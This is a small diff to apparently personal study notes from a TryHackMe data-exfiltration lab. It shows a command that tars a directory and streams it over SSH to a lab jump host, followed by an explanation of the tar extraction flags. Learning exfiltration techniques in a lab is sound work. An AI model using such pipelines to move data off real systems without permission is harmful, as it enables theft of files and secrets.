@@ -11,3 +11,10 @@ Finally, we redirect the dd command's output to transfer it using the TCP socket
 
 
 tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+
+x: Extracts files from the archive (unpacks the tarball).
+p: Preserves the file permissions (ownership, modes, etc.) when extracting.
+f: Specifies the archive file to operate on. In this case, - is used to read the archive from standard input.
+So, the command tar xpf - means:
+
+Extract the tarball from standard input (-), while preserving permissions.
